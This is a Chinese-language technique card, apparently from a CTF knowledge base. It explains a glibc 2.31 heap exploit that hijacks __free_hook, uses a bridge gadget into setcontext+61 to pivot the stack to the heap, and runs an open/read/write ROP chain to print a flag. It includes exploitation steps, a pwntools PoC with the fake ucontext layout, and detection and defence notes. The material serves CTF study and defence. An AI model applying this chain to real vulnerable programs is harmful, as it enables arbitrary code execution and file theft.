---
id: binary-pwn-heap-freehook-setcontext61-bridge-orw
title: __free_hook 接 setcontext+61：bridge gadget 把 rdi 转 rdx，read 自覆写堆栈后 ORW
type: scenario
domain: binary
path: binary/pwn/heap
technique: heap-freehook-setcontext61-bridge-read-orw
aliases:
- __free_hook 劫持
- setcontext+61
- free_hook setcontext 链
- bridge gadget rdi to rdx
- read 自覆写 ROP
- ORW 堆题
- magic gadget 控制 rdx
tags:
- pwn
- heap
- glibc-2.31
- free-hook
- setcontext
- stack-pivot
- rop
- orw
- ctf
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V94
  verified_at: '2026-11-05T19:45:35+08:00'
  notes: 已对照原文及15张图核对：__libc_free 调 __free_hook 时 rdi=被free指针、setcontext+61 从 rdx 恢复 r12-r15/rbp/rbx/rsi/rdi/r10/rdx 并 [rdx+0xa0] 切栈、libc+0x151bb0 bridge gadget(mov rdx,[rdi+8];mov [rsp],rax;call [rdx+0x20])、fake context 的 +0x20/+0x68/+0x70/+0x88/+0xa0/+0xa8 布局、read 自覆写后执行 open/read/write ORW 均与原文EXP/图05/06/14/15一致。未验证点：原文未展示完整运行输出，卡片置信度保持medium；EXP未本机复跑；CTF题无组件受影响版本；frontmatter无sources/source_url。
---

## 一句话结论

glibc 2.31 中 `free(ptr)` 会把 `ptr` 作为第一个参数进入 `__free_hook`（rdi = ptr）；把 `__free_hook` 改成 `setcontext+61` 还缺一步——setcontext 需要 `rdx` 指向伪造的 `ucontext_t`。用一个 bridge gadget（如 `mov rdx, [rdi+8]; mov [rsp], rax; call [rdx+0x20]`）把 `[被 free 块+8]` 取到 rdx 并调用 `[rdx+0x20]`，即可把 free 给到的 rdi 转换成 setcontext 需要的 rdx；setcontext 恢复寄存器并把 rsp 切到堆上伪造栈，再用一次 `read(0, rop_stack, len)` 自覆写堆内存写入完整 ROP 链，最终执行 open/read/write 读取 flag。

## 原理

- **free 的参数传递**：glibc 2.31 `__libc_free` 开头读取 `__free_hook`；若非空则调用 `hook(mem, RETURN_ADDRESS(0))`。SysV x86_64 下第一个参数在 `rdi`，即 `rdi = 被 free 的 chunk 用户指针`。因此攻击者能控制该 chunk 的内容，就能控制 hook 触发时 rdi 指向的数据。
- **setcontext+61 需要 rdx**：`setcontext` 把 `rdx` 当作 fake `ucontext_t`，从 `[rdx+0x48..0xa8]` 恢复 r12–r15、rbp、rbx、rsi、rdi、r10、rdx，从 `[rdx+0xa0]` 恢复 rsp，最后 `push r10; ret`（或 `jmp *r10`）跳到指定下一跳。它不直接读取 rdi，所以仅把 `__free_hook` 指向 setcontext+61 时，rdx 仍是 free 路径上的残留值，不可控。
- **bridge gadget**：示例 `mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20]`。由于 rdi 是刚被 free 的 chunk 指针，攻击者预先在 chunk+8 放 `fake_ctx_base`；gadget 把 `rdx = fake_ctx_base`，再调用 `[fake_ctx_base+0x20]`，把 `setcontext+61` 作为函数指针调用。此时 rdx 正好等于 fake_ctx_base，setcontext 按预期从 `fake_ctx_base` 恢复上下文。
- **fake ucontext 布局（示例偏移）**：`+0x20` 放 setcontext+61；`+0x68` = rdi（示例 0，read 的 fd）；`+0x70` = rsi（示例 rop_stack，read 的 buf）；`+0x88` = rdx（示例 len(stage2)，read 的长度）；`+0xa0` = rsp（示例 rop_stack）；`+0xa8` = r10（示例 read 地址）。setcontext 把 rsp 设为 rop_stack，然后 `push r10; ret` 进入 read；read 返回时从 rop_stack 弹出返回地址，正好执行刚读入的 stage2 ROP 链。
- **read 自覆写**：先把 rsp 指向堆上的 rop_stack，再调用 `read(0, rop_stack, len)` 把完整 ORW 链写到该地址；read 返回地址即 stage2 第一条 gadget，实现“第一阶段只负责布局，完整 ROP 第二阶段现场写入”，避免在 fake context 里塞下整条长链。
- **ORW 链**：`pop rdi; "/flag"; pop rsi; 0; pop rdx; 0; open` → `xchg eax, edi` 把 fd 放到 rdi → `pop rsi; buf; pop rdx; 0x40; read` → `pop rdi; 1; pop rsi; buf; pop rdx; 0x40; write`，输出 flag。
- **为什么需要 magic gadget**：原文在控制 `rdx` 时发现 setcontext 路径对 rdx 的控制不足，最终使用 libc+0x151bb0 的 bridge gadget 完成 rdi→rdx 转换；不同 libc 的 gadget 不同，需按符号/反汇编查找。
- **边界**：glibc 2.34+ 移除 `__free_hook`/`__malloc_hook`，该链失效，需要 FSOP/`exit_funcs` 等替代；setcontext 在部分版本有 `rdx` 使用差异（+61 偏移与恢复顺序随版本变化），必须按目标 libc 确认。高版本 CET/shadow stack 会阻断 ROP 栈迁移。

## 触发条件

- 目标为 glibc 2.31（示例 2.31-0ubuntu9.x），保留可写 `__free_hook`，且无 safe-linking 影响任意分配/写。
- 已获得 libc 基址（如 stdout 泄露），并具备任意分配/写或 tcache poisoning 能力，可覆写 `__free_hook`。
- 能控制被 free 的 chunk 内容，用于布置 `[chunk+8] = fake_ctx_base` 与 fake ucontext。
- 能找到目标 libc 中的 bridge gadget（rdi→rdx）与 setcontext+61 偏移；libc 版本已知。
- 程序有可读 stdin 的 `read`，用于第二阶段自覆写；否则需要在 fake context 中直接布置完整链。

## 利用步骤

1. 通过 stdout 泄露（或其它方式）得到 libc 基址，解析 `__free_hook`、`setcontext`、`read`、`open`、`pop rdi/rsi/rdx`、`xchg eax, edi` 等符号/ gadget。
2. 在目标 libc 中确认 `setcontext+61` 的寄存器恢复偏移（示例 +0x48/0x50/0x58/0x60/0x68/0x70/0x78/0x80/0x88/0xa0/0xa8）与 bridge gadget 地址。
3. 通过任意分配/写把 `__free_hook` 覆写为 bridge gadget（或直接指向能转 rdx 的 magic gadget）。
4. 布置被 free 的 chunk：`chunk+8 = fake_ctx_base`；在 `fake_ctx_base+0x20` 放 `setcontext+61`，`+0x68 = 0`、`+0x70 = rop_stack`、`+0x88 = len(stage2)`、`+0xa0 = rop_stack`、`+0xa8 = read`。
5. 触发 `free(chunk)`：free → bridge gadget → setcontext+61 → rsp = rop_stack → 调用 read(0, rop_stack, len)。
6. 发送提前构造好的 stage2 ORW ROP 链；read 返回后从 rop_stack 执行，open("/flag")、read、write 输出 flag。
7. 若没有可用的 read 自覆写路径，可在 fake context 中直接设置 rsp 到已布置好的链，或改用其他栈迁移 gadget。

## PoC

原文最终 EXP 的关键片段（glibc 2.31，偏移与地址为示例，未在本机执行）：

```python
libc.address = lib
free_hook = libc.sym['__free_hook']
setcontext = libc.sym['setcontext'] + 61
magicgadget = libc.address + 0x151bb0     # mov rdx,[rdi+8]; mov [rsp],rax; call [rdx+0x20]
rop_stack = free_hook + 0x200

stage2 = build_orw(rop_stack)             # open/read/write ROP 链，含 "/flag"

# 1) 让一次分配返回到 free_hook 附近并写入 bridge gadget
# 2) 布置 fake context：
add(1, 0xe0, flat({
    0x00: p64(magicgadget),
    0x20: p64(setcontext),
    0x68: p64(0),                 # rdi = 0 (read fd)
    0x70: p64(rop_stack),         # rsi = rop_stack
    0x88: p64(len(stage2)),       # rdx = len
    0xa0: p64(rop_stack),         # rsp = rop_stack
    0xa8: p64(libc.sym['read']),  # r10 = read
}, filler=b'\x00'))

# 3) 触发 free，进入 bridge -> setcontext -> read，然后发送 stage2
io.send(stage2)
```

ORW 链结构（原文 build_orw）：

```text
pop rdi; "/flag"; pop rsi; 0; pop rdx; 0; open
xchg eax, edi
pop rsi; buf; pop rdx; 0x40; read
pop rdi; 1; pop rsi; buf; pop rdx; 0x40; write
```

原文说明：仅把 `__free_hook` 改成 setcontext 时无法控制 rdx，使用 `libc+0x151bb0` 的 bridge gadget 后才成功把 `free` 的 rdi 转成 setcontext 需要的 rdx。原文给出了最终 EXP，但未展示完整的运行输出，故本卡置信度记为 medium。

## 变体与关联

- **直接 setcontext**：若能通过其他方式控制 rdx（如 UAF 后寄存器残留、上下文切换），可省掉 bridge gadget。
- **无 read 自覆写**：把完整 ROP 链直接放在 fake context 指向的堆内存，或使用 `setcontext` 恢复 rsp 到预置链。
- **高版本 glibc**：`__free_hook` 移除后，可用 `_IO_list_all`/FSOP（House of Apple）、`exit_funcs`、`_IO_wfile_jumps` 等；setcontext 偏移随版本变化。
- **关联**：投毒到 stdout/任意分配见 [[binary-pwn-heap-house-of-botcake-tcache-poison]] 与 [[binary-pwn-heap-stdout-partial-overwrite-libc-leak]]；其他 setcontext/FSOP 链见 [[binary-pwn-heap-largebin-io-list-all-wide-file-setcontext-orw]] 与 [[binary-pwn-heap-house-of-apple-2-stderr-fsop]]。
- **防御/检测**：修复堆漏洞与任意写；高版本 glibc 移除 hook；启用 CET/shadow stack 阻断 ROP 栈迁移。

## 检测与防御

- **内存完整性**：监控 `__free_hook` 是否被写成 libc 内非预期地址；fake `ucontext_t` 区域出现 setcontext/read gadget 指针。
- **行为检测**：free 后紧跟 `read` 大量数据、栈指针切换到堆地址、open/read/write 序列读取敏感文件；这类行为是 ORW 链的典型特征。
- **防御**：使用 glibc 2.34+（无 `__free_hook`）、启用 CET/shadow stack、代码完整性；修复 UAF/任意分配；对敏感文件访问做审计。
- **取证**：捕获 `__free_hook` 值、堆上的 fake context 与 ROP 链、open/read/write 的路径参数，可还原利用链。
